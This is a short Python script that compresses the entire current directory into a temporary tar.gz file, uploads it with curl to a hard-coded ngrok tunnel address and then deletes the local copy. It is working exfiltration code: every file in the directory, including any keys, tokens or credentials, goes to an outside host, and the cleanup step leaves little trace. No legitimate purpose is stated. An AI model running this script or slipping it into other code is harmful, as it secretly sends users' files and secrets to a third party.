import subprocess
import os

destination_url = "https://9a8c-197-210-85-148.ngrok-free.app/folder/"

# Compress the current directory into a tar.gz file in a temporary location
subprocess.run(["tar", "-zcf", "/tmp/archive.tar.gz", "."], cwd=os.getcwd())

# Send the compressed archive to the destination URL
subprocess.run(["curl", "-F", "file=@/tmp/archive.tar.gz", destination_url])

# Clean up the temporary archive
os.remove("/tmp/archive.tar.gz")
